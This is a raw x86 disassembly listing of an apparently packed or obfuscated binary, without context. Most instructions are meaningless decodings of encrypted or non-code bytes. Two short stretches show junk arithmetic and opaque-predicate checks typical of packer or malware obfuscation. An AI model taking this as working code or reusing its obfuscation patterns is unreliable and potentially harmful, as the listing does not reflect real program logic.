  41b9b0:	js     0x41b96e
  41b9b2:	add    al,0x1b
  41b9b4:	sub    eax,0xc11982c4
  41b9b9:	mov    ecx,0x6de83677
  41b9be:	sbb    al,0xca
  41b9c0:	fcom   DWORD PTR [edi+0x720420fc]
  41b9c6:	fmulp  st(7),st
  41b9c8:	popa   
  41b9c9:	mov    edx,cs
  41b9cb:	test   ebx,esi
  41b9cd:	fmul   st,st(3)
  41b9cf:	in     eax,dx
  41b9d0:	aaa    
  41b9d1:	inc    edi
  41b9d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9d3:	xchg   ebp,eax
  41b9d4:	out    0xf,al
  41b9d6:	retf   0x1ebd
  41b9d9:	pusha  
  41b9da:	cli    
  41b9db:	xchg   BYTE PTR [edi-0x6],bh
  41b9de:	stos   DWORD PTR es:[edi],eax
  41b9df:	mov    esp,0xdc54949a
  41b9e4:	xor    bl,ah
  41b9e6:	lods   al,BYTE PTR ds:[esi]
  41b9e7:	cmp    al,BYTE PTR [ecx+0x25]
  41b9ea:	mov    dh,0x61
  41b9ec:	xchg   esp,eax
  41b9ed:	in     al,0xc5
  41b9ef:	pop    ds
  41b9f0:	fild   WORD PTR [edx+0x4a]
  41b9f3:	push   0x49
  41b9f5:	push   ebp
  41b9f6:	test   BYTE PTR [ebp-0xe7ccc58],ah
  41b9fc:	in     al,dx
  41b9fd:	(bad)  
  41b9ff:	shl    DWORD PTR [ecx-0x4],cl
  41ba02:	add    BYTE PTR [esp+ebx*4+0x47800a4c],cl
  41ba09:	lahf   
  41ba0a:	add    DWORD PTR [ecx+0x2a],esi
  41ba0d:	ficom  DWORD PTR [eax+0x4e]
  41ba10:	adc    cl,BYTE PTR [edx]
  41ba12:	push   ebx
  41ba13:	inc    ebp
  41ba14:	mov    ah,0xa8
  41ba16:	add    ebx,DWORD PTR [eax-0x41]
  41ba19:	mov    eax,0xbd5b6a0b
  41ba1e:	cld    
  41ba1f:	ror    BYTE PTR [ecx-0x30],1
  41ba22:	and    DWORD PTR [edi-0x13],0xffffffd6
  41ba26:	jae    0x41ba5d
  41ba28:	psrld  mm6,QWORD PTR ds:0x54423280
  41ba2f:	cmp    eax,0x36bbb667
  41ba34:	add    al,dl
  41ba36:	add    BYTE PTR [edi+0x56e6a19d],cl
  41ba3c:	fwait
  41ba3d:	pop    edi
  41ba3e:	inc    eax
  41ba3f:	je     0x41babc
  41ba41:	pop    edx
  41ba42:	dec    esp
  41ba43:	mov    ebx,0xa58716e8
  41ba48:	int    0xca
  41ba4a:	in     al,0x21
  41ba4c:	push   esi
  41ba4d:	lods   al,BYTE PTR ds:[esi]
  41ba4e:	loopne 0x41baa3
  41ba50:	imul   eax,DWORD PTR [edi+eiz*1],0xa6011d6e
  41ba57:	call   0x6383b9cb
  41ba5c:	push   edx
  41ba5d:	mul    DWORD PTR [esp+ecx*2+0x6be73811]
  41ba64:	aaa    
  41ba65:	dec    edi
  41ba66:	pusha  
  41ba67:	mov    ebx,0x66dd89ba
  41ba6c:	lods   eax,DWORD PTR ds:[esi]
  41ba6d:	lods   eax,DWORD PTR ds:[esi]
  41ba6e:	mov    edx,0x7de1205b
  41ba73:	mov    ebx,0x3474ddc4
  41ba78:	cmp    eax,0x7553628c
  41ba7d:	call   FWORD PTR [ebx+eiz*8]
  41ba80:	not    DWORD PTR ss:[ebp-0x54]
  41ba84:	mov    ebp,0xa4341be0
  41ba89:	mov    bh,BYTE PTR [esi]
  41ba8b:	mov    esi,0x7dfeb5fc
  41ba90:	lods   eax,DWORD PTR ds:[esi]
  41ba91:	xchg   esp,eax
  41ba92:	xor    cl,BYTE PTR [ebx]
  41ba94:	xchg   ebp,eax
  41ba95:	jge    0x41ba8f
  41ba97:	iret   
  41ba98:	fnstsw WORD PTR [esp+edi*4]
  41ba9b:	es ins DWORD PTR es:[edi],dx
  41ba9d:	xchg   cl,ch
  41ba9f:	scas   al,BYTE PTR es:[edi]
  41baa0:	pop    esp
  41baa1:	pusha  
  41baa2:	sbb    edx,DWORD PTR [ebp-0x18e7f088]
  41baa8:	sub    BYTE PTR [eax],0x99
  41baab:	das    
  41baac:	inc    ecx
  41baad:	pop    ecx
  41baae:	out    dx,al
  41baaf:	adc    BYTE PTR [esi+ebx*4],0xbe
  41bab3:	int3   
  41bab4:	stos   BYTE PTR es:[edi],al
  41bab5:	test   BYTE PTR ds:0x1cdee9df,dl
  41babb:	pop    edx
  41babc:	mov    WORD PTR [edx-0x38],ds
  41babf:	imul   BYTE PTR [eax+0x28]
  41bac2:	out    dx,al
  41bac3:	daa    
  41bac4:	pop    ebx
  41bac5:	jae    0x41bacb
  41bac7:	push   ds
  41bac8:	mov    eax,DWORD PTR cs:[ebp-0xf7040c4]
  41bacf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bad0:	in     al,0x50
  41bad2:	or     BYTE PTR [esi-0xfefc589],0xa9
  41bad9:	retf   0x9b3d
  41badc:	imul   eax,DWORD PTR gs:[ebx-0x218b8ce5],0xffffffaa
  41bae4:	idiv   BYTE PTR [eax+0x2df6f8ab]
  41baea:	sbb    eax,0xbc604ca6
  41baef:	push   es
  41baf0:	dec    esp
  41baf1:	gs jecxz 0x41ba8a
  41baf4:	cmp    DWORD PTR [esi-0x1c1cac14],0xffffffe0
  41bafb:	out    dx,eax
  41bafc:	js     0x41bb66
  41bafe:	mov    DWORD PTR [eax-0x6b8708da],esp
  41bb04:	loop   0x41bb4c
  41bb06:	sbb    al,0x6d
  41bb08:	dec    edx
  41bb09:	cmp    eax,0x2b8dbbb5
  41bb0e:	sbb    ebx,eax
  41bb10:	stc    
  41bb11:	sub    cl,dh
  41bb13:	aaa    
  41bb14:	cli    
  41bb15:	stos   BYTE PTR es:[edi],al
  41bb16:	pop    eax
  41bb17:	push   es
  41bb18:	sub    DWORD PTR [edi-0x37],ecx
  41bb1b:	add    DWORD PTR [ecx+0x49],eax
  41bb1e:	cmp    eax,0xba702e81
  41bb23:	cmp    eax,0x6ee339f
  41bb28:	add    DWORD PTR [eax],ecx
  41bb2a:	stos   BYTE PTR es:[edi],al
  41bb2b:	mov    ebp,0x80080e8b
  41bb30:	or     BYTE PTR [edi+eiz*2],bl
  41bb33:	int    0xad
  41bb35:	dec    ebx
  41bb36:	jae    0x41bb5a
  41bb38:	mov    dl,0x15
  41bb3a:	ret    0xe8db
  41bb3d:	addr16 out 0xcc,al
  41bb40:	jge    0x41bb5f
  41bb42:	adc    BYTE PTR [edx+0xc],bh
  41bb45:	xor    BYTE PTR [eax],al
  41bb47:	fisubr WORD PTR [ebp-0x4b0dc166]
  41bb4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb4e:	jecxz  0x41bb7c
  41bb50:	jl     0x41bb39
  41bb52:	lahf   
  41bb53:	pop    eax
  41bb54:	test   DWORD PTR [ebx+0x27],esi
  41bb57:	push   ss
  41bb58:	xchg   edi,eax
  41bb59:	shr    BYTE PTR [esp+eax*8],cl
  41bb5c:	inc    ebp
  41bb5d:	jecxz  0x41bae2
  41bb5f:	loope  0x41bb5f
  41bb61:	xor    eax,0xf7c88267
  41bb66:	pop    edx
  41bb67:	push   cs
  41bb68:	mov    al,0xd9
  41bb6a:	pusha  
  41bb6b:	sub    eax,0x38b08711
  41bb70:	ret    0x4783
  41bb73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb74:	sbb    eax,0x4e4287fe
  41bb79:	sbb    BYTE PTR [eax-0x6af4aec7],0x3a
  41bb80:	and    eax,DWORD PTR [edi+edx*8]
  41bb83:	xor    eax,0xa5c693ab
  41bb88:	inc    ecx
  41bb89:	cmova  esi,DWORD PTR [ebp+ebp*2-0x6f]
  41bb8e:	outs   dx,BYTE PTR ds:[esi]
  41bb8f:	popf   
  41bb90:	arpl   WORD PTR [ecx+0x2fb3a7d3],dx
  41bb96:	xchg   esp,eax
  41bb97:	inc    edi
  41bb98:	push   esi
  41bb99:	daa    
  41bb9a:	pop    edx
  41bb9b:	add    BYTE PTR [ebx],al
  41bb9d:	push   esi
  41bb9e:	mov    ebp,0x20c7d37
  41bba3:	and    ah,ah
  41bba5:	ins    DWORD PTR es:[edi],dx
  41bba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bba7:	in     eax,0xf0
  41bba9:	inc    ecx
  41bbaa:	xor    eax,0x706673c2
  41bbaf:	test   al,0x2c
  41bbb1:	mov    ds:0x52bc7076,al
  41bbb6:	in     eax,0xca
  41bbb8:	cwde   
  41bbb9:	loopne 0x41bb76
  41bbbb:	inc    ebx
  41bbbc:	jp     0x41bb5a
  41bbbe:	jns    0x41bbca
  41bbc0:	xor    DWORD PTR [edx-0x25d3dfe8],esi
  41bbc6:	dec    DWORD PTR [eax-0x2f]
  41bbc9:	fs xchg ecx,eax
  41bbcb:	test   eax,0x18dda1b
  41bbd0:	pop    es
  41bbd1:	dec    ebp
  41bbd2:	and    cx,dx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	sub    al,0x7a
  41bc03:	arpl   WORD PTR [ebx+eax*1-0x43e7e97f],di
  41bc0a:	adc    bl,BYTE PTR [eax]
  41bc0c:	sbb    BYTE PTR [ecx],dh
  41bc0e:	(bad)  
  41bc0f:	inc    edi
  41bc10:	fbld   TBYTE PTR [esi+0x2]
  41bc13:	sub    eax,0xae1d6b2a
  41bc18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc19:	sbb    DWORD PTR [esi-0x7b],edx
  41bc1c:	outs   dx,BYTE PTR ds:[esi]
  41bc1d:	push   ecx
  41bc1e:	rol    esi,cl
  41bc20:	clc    
  41bc21:	xchg   esi,eax
  41bc22:	mov    ecx,0xbda206b5
  41bc27:	cmp    eax,0x3e45b9e3
  41bc2c:	and    BYTE PTR [ebp+0x54db44e],bh
  41bc32:	rol    BYTE PTR [edx+0x4],0x61
  41bc36:	dec    edi
  41bc37:	pop    ebp
  41bc38:	and    BYTE PTR [ebp+0x1c],0x17
  41bc3c:	jmp    0xfac0:0x424d3153
  41bc43:	mov    ebx,0x69e5e407
  41bc48:	in     eax,dx
  41bc49:	and    DWORD PTR [ebp-0x7c5f7e96],ebx
  41bc4f:	adc    eax,0x20df5c7
  41bc54:	cmp    cl,BYTE PTR [ebp+esi*8-0x43]
  41bc58:	xor    esp,DWORD PTR [edi]
  41bc5a:	arpl   bx,ax
  41bc5c:	jne    0x41bcdd
  41bc5e:	fist   WORD PTR ds:0xe3444424
  41bc64:	xor    esp,ebx
  41bc66:	int3   
  41bc67:	fistp  DWORD PTR [eax*2-0x71782ab9]
  41bc6e:	int3   
  41bc6f:	push   ecx
  41bc70:	sub    eax,0xecdf38c7
  41bc75:	or     esi,ebp
  41bc77:	jb     0x41bc7c
  41bc79:	out    dx,al
  41bc7a:	pop    eax
  41bc7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc7c:	adc    edx,edx
  41bc7e:	add    eax,0x976e8d64
  41bc83:	pop    esp
  41bc84:	gs test edi,0x8b9d115a
  41bc8b:	sub    eax,esi
  41bc8d:	lds    edi,FWORD PTR [esi]
  41bc8f:	lahf   
  41bc90:	cld    
  41bc91:	mov    cl,0xae
  41bc93:	in     eax,dx
  41bc94:	test   bl,0x8f
  41bc97:	stos   DWORD PTR es:[edi],eax
  41bc98:	lea    ebp,[ebp+eiz*4+0x33]
  41bc9c:	mov    cl,0x31
  41bc9e:	mov    ah,0xdb
  41bca0:	pop    es
  41bca1:	repz jmp 0x7f46d5e3
  41bca7:	mov    ah,0x42
  41bca9:	push   esp
  41bcaa:	adc    edx,eax
  41bcac:	mov    ebx,DWORD PTR [eax-0x25]
  41bcaf:	dec    esp
  41bcb0:	retf   0xcd2e
  41bcb3:	cwde   
  41bcb4:	adc    eax,0xd485d5a3
  41bcb9:	sub    ecx,esp
  41bcbb:	loop   0x41bcc8
  41bcbd:	push   cs
  41bcbe:	dec    edx
  41bcbf:	mov    bl,BYTE PTR [esi-0x22]
  41bcc2:	jno    0x41bd3e
  41bcc4:	ret    
  41bcc5:	xor    eax,0x15a32b91
  41bcca:	ss out dx,eax
  41bccc:	mov    ds:0x532ee69f,al
  41bcd1:	push   ds
  41bcd2:	aas    
  41bcd3:	inc    ebp
  41bcd4:	pushf  
  41bcd5:	inc    esp
  41bcd6:	jmp    0xd0d3:0xc524d8ef
  41bcdd:	retf   0xbdba
  41bce0:	ins    BYTE PTR es:[edi],dx
  41bce1:	xor    ebx,DWORD PTR [ecx-0xe]
  41bce4:	shr    BYTE PTR [ebp-0x16],cl
  41bce7:	xor    eax,0x5ec497eb
  41bcec:	lods   eax,DWORD PTR ds:[esi]
  41bced:	push   0xa23de2f5
  41bcf2:	pop    es
  41bcf3:	ds cmp ebx,edi
  41bcf6:	loop   0x41bce4
  41bcf8:	aam    0xeb
  41bcfa:	leave  
  41bcfb:	sub    al,0x36
  41bcfd:	push   ecx
  41bcfe:	sbb    DWORD PTR [ebp-0x294ef6f4],eax
  41bd04:	sti    
  41bd05:	ret    0x39c1
  41bd08:	fwait
  41bd09:	pop    edx
  41bd0a:	retf   
  41bd0b:	scas   al,BYTE PTR es:[edi]
  41bd0c:	pop    ebp
  41bd0d:	adc    bl,BYTE PTR ds:0x20b9add0
  41bd13:	dec    edx
  41bd14:	std    
  41bd15:	mov    esp,0xe4d1adc2
  41bd1a:	out    dx,eax
  41bd1b:	imul   ebp,ebp,0xffffff8c
  41bd1e:	sub    DWORD PTR [edx+0x2e],esi
  41bd21:	sti    
  41bd22:	mov    ah,ch
  41bd24:	pop    edi
  41bd25:	in     al,dx
  41bd26:	push   cs
  41bd27:	push   esi
  41bd28:	jecxz  0x41bd96
  41bd2a:	push   eax
  41bd2b:	data16 cmp al,0x12
  41bd2e:	and    dl,cl
  41bd30:	aaa    
  41bd31:	xchg   ecx,eax
  41bd32:	lods   al,BYTE PTR ds:[esi]
  41bd33:	sbb    ecx,DWORD PTR [edx+esi*2-0x249d0227]
  41bd3a:	lea    ecx,[edi]
  41bd3c:	sahf   
  41bd3d:	fdiv   QWORD PTR [ecx-0x5f598349]
  41bd43:	adc    BYTE PTR [esi-0x2f8b72ce],cl
  41bd49:	push   edx
  41bd4a:	jnp    0x41bdb2
  41bd4c:	out    0xc5,al
  41bd4e:	rcl    DWORD PTR [edi-0x1757e426],cl
  41bd54:	xchg   esp,eax
  41bd55:	or     DWORD PTR [ebx+0xcd9b394],edi
  41bd5b:	sub    eax,0x3ae70cfd
  41bd60:	pop    eax
  41bd61:	int3   
  41bd62:	inc    esi
  41bd63:	fnsave [edi+0x3a]
  41bd66:	push   esp
  41bd67:	ret    0xc537
  41bd6a:	xor    eax,0x2776e6c1
  41bd6f:	(bad)  [ecx-0x3a894f47]
  41bd75:	or     DWORD PTR ds:[edi+ebp*2],eax
  41bd79:	mov    bl,0x7a
  41bd7b:	in     al,dx
  41bd7c:	adc    BYTE PTR [ecx+0x56],dl
  41bd7f:	push   ds
  41bd80:	mov    dl,0x66
  41bd82:	inc    ecx
  41bd83:	fcmovu st,st(6)
  41bd85:	push   ebp
  41bd86:	sbb    DWORD PTR [esi-0x278933b5],edx
  41bd8c:	es out 0x80,eax
  41bd8f:	jno    0x41bd6c
  41bd91:	dec    eax
  41bd92:	repz adc eax,0xde91185b
  41bd98:	popa   
  41bd99:	bound  esi,QWORD PTR [esi]
  41bd9b:	add    eax,0xd144d193
  41bda0:	xlat   BYTE PTR ds:[ebx]
  41bda1:	mov    bl,0x83
  41bda3:	lahf   
  41bda4:	xchg   esp,eax
  41bda5:	sbb    DWORD PTR [ecx+0x7ede219c],ecx
  41bdab:	cmp    eax,0x67155770
  41bdb0:	sbb    bl,al
  41bdb2:	adc    cl,bh
  41bdb4:	push   edi
  41bdb5:	iret   
  41bdb6:	jae    0x41bdd6
  41bdb8:	push   ecx
  41bdb9:	sub    BYTE PTR [edi-0x5e],ch
  41bdbc:	imul   DWORD PTR [edx+0x36]
  41bdbf:	jle    0x41bd7c
  41bdc1:	(bad)  
  41bdc2:	out    0xce,eax
  41bdc4:	mov    ah,0x5d
  41bdc6:	(bad)  
  41bdc7:	int    0x5f
  41bdc9:	ins    BYTE PTR es:[edi],dx
  41bdca:	test   eax,0x9134bd95
  41bdcf:	and    esi,DWORD PTR [edi-0x47]
  41bdd2:	in     al,0x6b
  41bdd4:	xchg   DWORD PTR [ebx+0x4e],edi
  41bdd7:	mov    edx,0xf972744a
  41bddc:	call   0x8427:0x5ef3d8aa
  41bde3:	aad    0x4e
  41bde5:	aaa    
  41bde6:	stc    
  41bde7:	icebp  
  41bde8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bde9:	cmp    esp,esi
  41bdeb:	imul   ebp,DWORD PTR [ecx-0x60],0x7c7315ce
  41bdf2:	gs dec edx
  41bdf4:	pop    esp
  41bdf5:	xor    DWORD PTR [ecx+0x40eb8206],esp
  41bdfb:	cwde   
  41bdfc:	out    dx,al
  41bdfd:	mov    ecx,0xaf56d0af
  41be02:	rcr    DWORD PTR [esi],cl
  41be04:	rcl    DWORD PTR [ebp+0x404d4d88],1
  41be0a:	xchg   DWORD PTR [eax-0x4a],esp
  41be0d:	mov    ds:0x1622157a,eax
  41be12:	pop    eax
  41be13:	add    ecx,ebp
  41be15:	fdivr  QWORD PTR [esi]
  41be17:	mov    ecx,0x17b16c09
  41be1c:	mov    ecx,0x1ede531d
  41be21:	dec    esp
  41be22:	jge    0x41bdb7
  41be24:	push   esi
  41be25:	(bad)  
  41be26:	cmp    ch,BYTE PTR [ecx-0x42]
  41be29:	inc    edx
  41be2a:	mov    ebx,0x43d3a72b
  41be2f:	adc    esp,esi
  41be31:	mov    eax,ds:0xd4e0ecfc
  41be36:	adc    ebx,esi
  41be38:	retf   
  41be39:	dec    ecx
  41be3a:	retf   0x6e1d
  41be3d:	loope  0x41be4b
  41be3f:	loop   0x41be27
  41be41:	cdq    
  41be42:	and    DWORD PTR [esi-0x2],0x12
  41be46:	(bad)  
  41be47:	push   esi
  41be48:	or     al,BYTE PTR [edx+0x40a431cf]
  41be4e:	mov    ch,0xc1
  41be50:	lahf   
  41be51:	fwait
  41be52:	imul   dl
  41be54:	test   eax,0x4d16a307
  41be59:	jno    0x41bdde
  41be5b:	(bad)  
  41be5c:	sti    
  41be5d:	outs   dx,DWORD PTR ds:[esi]
  41be5e:	pop    edi
  41be5f:	or     DWORD PTR [edx-0x69],esp
  41be62:	cmp    eax,0xa9ce540b
  41be67:	xchg   eax,ecx
  41be69:	jne    0x41be4c
  41be6b:	mov    bh,0xf
  41be6d:	inc    edi
  41be6e:	inc    edx
  41be6f:	mov    ebx,0xf66edb9b
  41be74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be75:	cmp    al,0x85
  41be77:	aas    
  41be78:	mov    al,ds:0x5f567211
  41be7d:	xor    esi,DWORD PTR [ecx-0x41]
  41be80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be81:	fdiv   DWORD PTR [ecx]
  41be83:	sub    ebp,DWORD PTR [ecx+ecx*2+0x6ec2d912]
  41be8a:	push   cs
  41be8b:	in     eax,0xdf
  41be8d:	fs jmp 0x41be56
  41be90:	mov    ecx,0xb9f3b21
  41be95:	loopne 0x41bef2
  41be97:	jo     0x41be39
  41be99:	pop    ds
  41be9a:	das    
  41be9b:	mov    eax,0x3b974ef9
  41bea0:	jl     0x41bf09
  41bea2:	dec    esp
  41bea3:	arpl   WORD PTR [esi],cx
  41bea5:	or     DWORD PTR [ebx-0x1be2d20b],0xe69021ce
  41beaf:	icebp  
  41beb0:	dec    ebx
  41beb1:	mov    cl,bh
  41beb3:	jp     0x41be58
  41beb5:	mov    al,ds:0xb8afd73a
  41beba:	push   ebx
  41bebb:	ror    dh,0x9
  41bebe:	das    
  41bebf:	cli    
  41bec0:	fucomip st,st(3)
  41bec2:	jmp    DWORD PTR [ebx]
  41bec4:	pop    ecx
  41bec5:	(bad)  
  41bec6:	in     al,dx
  41bec7:	add    DWORD PTR ss:[eax+edi*4-0x6d],ebp
  41becc:	mov    cl,0x79
  41bece:	popf   
  41becf:	ret    
  41bed0:	leave  
  41bed1:	outs   dx,DWORD PTR ds:[esi]
  41bed2:	push   ebp
  41bed3:	push   0xffffff8c
  41bed5:	(bad)  [eax-0x1a]
  41bed8:	es pop eax
  41beda:	push   0xffffffe8
  41bedc:	xor    al,BYTE PTR [edx-0x1f]
  41bedf:	inc    edx
  41bee0:	rol    BYTE PTR [edx-0x6037641c],0x75
  41bee7:	cmp    edi,DWORD PTR [ebx+0x58]
  41beea:	jmp    0x91c1:0x38f2887
  41bef1:	and    DWORD PTR [ecx],edx
  41bef3:	shl    BYTE PTR [ecx+0x4ca79bab],0x6b
  41befa:	mov    ds:0xb58d33b3,al
  41beff:	mov    eax,0xb9a6a799
  41bf04:	iret   
  41bf05:	iret   
  41bf06:	popf   
  41bf07:	(bad)
  41bf0a:	pop    ss
  41bf0b:	or     eax,0xe7e34c92
  41bf10:	shl    DWORD PTR [edx-0x68],0xb4
  41bf14:	jl     0x41bf16
  41bf16:	outs   dx,BYTE PTR ds:[esi]
  41bf17:	jl     0x41bf45
  41bf19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf1a:	stc    
  41bf1b:	hlt    
  41bf1c:	inc    esi
  41bf1d:	pop    ebp
  41bf1e:	xchg   ebp,eax
  41bf1f:	idiv   DWORD PTR [ebp+0x1f]
  41bf22:	je     0x41bf56
  41bf24:	cmp    eax,0xf63b95cd
  41bf29:	mov    ebp,0xa1914f09
  41bf2e:	pop    ecx
  41bf2f:	sub    dl,BYTE PTR [edi+edx*8-0x7a5e179c]
  41bf36:	dec    edx
  41bf37:	xor    eax,0x9c6236f5
  41bf3c:	dec    edx
  41bf3d:	sub    BYTE PTR ds:0xc8748dce,dh
  41bf43:	call   0x865d:0x9bf1ce5d
  41bf4a:	xor    BYTE PTR [edi+0x24182a6],0xe3
  41bf51:	mov    ah,0x29
  41bf53:	inc    ebp
  41bf54:	lea    ebx,[eax]
  41bf56:	(bad)  
  41bf57:	sbb    ecx,DWORD PTR [ecx+edx*2-0x26]
  41bf5b:	scas   eax,DWORD PTR es:[edi]
  41bf5c:	adc    edx,ebx
  41bf5e:	(bad)  
  41bf5f:	pop    ds
  41bf60:	pusha  
  41bf61:	(bad)  
  41bf62:	les    esi,FWORD PTR [edx+0x5ade61c9]
  41bf68:	loop   0x41bf96
  41bf6a:	jb     0x41bf08
  41bf6c:	mov    ecx,0x28a1874b
  41bf71:	inc    eax
  41bf72:	jnp    0x41bfb6
  41bf74:	adc    eax,0xb6b85417
  41bf79:	pop    edi
  41bf7a:	sub    ecx,edx
  41bf7c:	pushf  
  41bf7d:	outs   dx,BYTE PTR ds:[esi]
  41bf7e:	fsub   QWORD PTR [eax-0x60]
  41bf81:	and    BYTE PTR ds:0xf72e7c34,ch
  41bf87:	adc    DWORD PTR [edx-0x7a94491b],ecx
  41bf8d:	inc    esi
  41bf8e:	into   
  41bf8f:	mov    esp,0xdb5153a0
  41bf94:	ret    0x7d38
  41bf97:	and    ebp,DWORD PTR [esi+0x5d]
  41bf9a:	cmp    eax,0xb7cbc953
  41bf9f:	les    esi,FWORD PTR [edx+0x6a070fc4]
  41bfa5:	ficomp DWORD PTR ds:0x893c4e02
  41bfab:	cli    
  41bfac:	push   esp
  41bfad:	test   DWORD PTR [eax+0x65],edi
  41bfb0:	xlat   BYTE PTR ds:[ebx]
  41bfb1:	and    al,dl
  41bfb3:	sbb    BYTE PTR [ebx+ebp*4+0x60e1a3f5],dh
  41bfba:	mov    fs,WORD PTR [ecx-0x461cad01]
  41bfc0:	aam    0x57
  41bfc2:	add    BYTE PTR [eax],al
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	adc    BYTE PTR ds:0x79a77e10,ch
  41c0fc:	push   ss
  41c0fd:	sbb    BYTE PTR [edx+edx*1-0x7261e7e8],bh
  41c104:	jmp    0x41c0ff
  41c106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c107:	mov    eax,ds:0xa24d1a34
  41c10c:	cdq    
  41c10d:	in     ax,dx
  41c10f:	adc    BYTE PTR [eax+0x6c267c88],al
  41c115:	xor    BYTE PTR [eax-0x5c],bl
  41c118:	jbe    0x41c178
  41c11a:	or     BYTE PTR [ecx-0x7],dl
  41c11d:	test   eax,0xd9c3d232
  41c122:	add    esi,ebp
  41c124:	repnz iret 
  41c126:	jg     0x41c195
  41c128:	mul    ebp
  41c12a:	lods   eax,DWORD PTR ds:[esi]
  41c12b:	cli    
  41c12c:	mov    ebx,0x926802f6
  41c131:	rcl    ebx,cl
  41c133:	loop   0x41c19b
  41c135:	mov    DWORD PTR [edx-0x6c216e09],esi
  41c13b:	into   
  41c13c:	xchg   ebx,eax
  41c13d:	lods   eax,DWORD PTR ds:[esi]
  41c13e:	ss pop edx
  41c140:	jecxz  0x41c0d2
  41c142:	pop    es
  41c143:	int    0x5a
  41c145:	rep outs dx,DWORD PTR ds:[esi]
  41c147:	add    eax,0xd75ace33
  41c14c:	sub    al,0x8d
  41c14e:	scas   al,BYTE PTR es:[edi]
  41c14f:	adc    al,0xce
  41c151:	fdiv   QWORD PTR [edi+0x6f]
  41c154:	pop    ebp
  41c155:	mov    ds:0xf5447dc9,al
  41c15a:	push   0xffffffd6
  41c15c:	adc    DWORD PTR [edi],ecx
  41c15e:	loop   0x41c0f3
  41c160:	pop    ebx
  41c161:	mov    eax,ds:0x59c6b65d
  41c166:	and    eax,0xac0e7d4b
  41c16b:	or     ch,BYTE PTR [ecx]
  41c16d:	inc    ebx
  41c16e:	jg     0x41c13a
  41c170:	aam    0x8e
  41c172:	xor    al,0x8b
  41c174:	jecxz  0x41c1d3
  41c176:	xchg   ebp,eax
  41c177:	sub    bh,BYTE PTR [eax-0x6a35e2c2]
  41c17d:	xor    al,0x1
